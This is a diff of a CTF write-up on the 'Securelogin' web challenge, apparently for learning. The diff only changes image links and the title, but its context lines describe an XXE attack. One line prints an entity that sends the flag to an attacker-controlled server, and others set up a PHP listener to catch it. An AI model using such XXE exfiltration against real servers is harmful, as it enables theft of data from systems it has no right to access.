@@ -1,4 +1,4 @@
-## GenerationZ Challenge (challenge.fi) | Web | Securelogin
+## Generation Z Challenge (challenge.fi) | Web | Securelogin
 ##### Author: Sanduuz | Date: 06.06.2021
 ---
 ### Challenge details:
@@ -28,13 +28,13 @@
 
 The challenge starts with a website that looks like this:
 
-<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/website_frontpage.png" width="428" height="281" />
+<img src="./attachments/website_frontpage.png" width="428" height="281" />
 
 First we should take a look at the source code of the website in order to see what it might be hiding. This can be achieved by clicking the right mouse button and choosing `View page source` or simply with the keyboard shortcut <kbd>CTRL</kbd>+<kbd>U</kbd>.
 
 The source code of the frontpage:
 
-<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/website_sourcecode.png" width="1440" height="320" />
+<img src="./attachments/website_sourcecode.png" width="1440" height="320" />
 
 As we can see, the source code of the wegpage is hiding a comment left behind by the developer. The comment starts with `Debug info, remember to remove before moving to prod:`
 
@@ -44,7 +44,7 @@ The debug information seems to be a HTTP POST request to `xml.php` residing on t
 
 Decoding this data sent in the debug request results in some XML data.
 
-<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/xml_data.png" />
+<img src="./attachments/xml_data.png" />
 
 The XML data sent with the request starts with a XML declaration that is used to specify metadata for the parser. This metadata includes xml version and character encoding to be used by the parser.
 
@@ -56,7 +56,7 @@ Time to dig deeper and start experimenting by ourselves.
 
 Let us traverse to the path `/xml.php` on the server to see whether the file still exists after moving to production.
 
-<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/xml.php.png" />
+<img src="./attachments/xml.php.png" />
 
 We did not get a 404-error, which means that the file still exists. The response returns an error message stating that username or password was not found. This is because instead of sending a HTTP POST request with the XML data, a HTTP GET request was sent to the server.
 
@@ -92,7 +92,7 @@ print(request.text)
 
 Running the script `python3 send_request.py` lets us see the server response when trying to authenticate with `admin:admin` credentials.
 
-<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/creds_not_found.png">
+<img src="./attachments/creds_not_found.png">
 
 Yet again the same error as previously. 
 
@@ -102,7 +102,7 @@ What if we try to trick the XML parser into crashing? That might give us some ex
 
 We can check that by using the same script, but this time let's change the credentials from `admin` to ```!@#$%^&*()_+{}><;:'"`\\/```
 
-<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/creds_not_found.png">
+<img src="./attachments/creds_not_found.png">
 
 Still nothing... 
 
@@ -114,7 +114,7 @@ What about completely changing the XML body?
 </a>
 ```
 
-<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/creds_not_found.png">
+<img src="./attachments/creds_not_found.png">
 
 Nope, still the same error. There is no more new information available it seems. We just need to `Try Harder!`
 
@@ -261,13 +261,13 @@ This should trigger the server to make a HTTP GET request to our webserver passi
 
 Let's quickly set up our webserver with `php -S 0.0.0.0:80`
 
-<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/php-server.png" width="500">
+<img src="./attachments/php-server.png" width="500">
 
 However, when we send that XML document to the server the same old bland response `Username or password not found! Try Harder!` is sent back and no connection is received on our webserver. Why does this happen?
 
 Well according to the [World Wide Web Consortium's (W3C) recommendation on XML](https://www.w3.org/TR/2006/REC-xml-20060816/REC-xml-20060816.xml): parameter entity references must not occur within markup declarations in the internal DTD subset; However, that does not apply to references that occur in external parameter entities.
 
-<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/xml_specification.png">
+<img src="./attachments/xml_specification.png">
 
 Our current exploit indeed does have parameter entity reference within a markup declaration in the internal DTD subset right here:
 `<!ENTITY % XXE "<!ENTITY exfil SYSTEM 'http://[IP REDACTED]/?flag=%flag;'>">`
@@ -297,7 +297,7 @@ Now this should surely work.
 
 Let's spin up our server once again and send our payload.
 
-<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/php-server.png" width="500">
+<img src="./attachments/php-server.png" width="500">
 
 Hmm... There's nothing coming through... Is the server really vulnerable to XXE?
 
@@ -334,19 +334,19 @@ This time when starting up our webserver, instead of the standard HTTP port 80, 
 
 `php -S 0.0.0.0:21`
 
-<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/php-server-21.png" width="500">
+<img src="./attachments/php-server-21.png" width="500">
 
 Time to send our payload and hope for the best...
 
 Now look at that!
 
-<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/pwned.png">
+<img src="./attachments/pwned.png">
 
 We can see that the server retrieved our malicious DTD file and shortly after that made a GET request back to our server with some base64 data.
 
 Let's decode that base64 data and see if it actually is the flag.
 
-<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/flag.png">
+<img src="./attachments/flag.png">
 
 It is the flag!
 
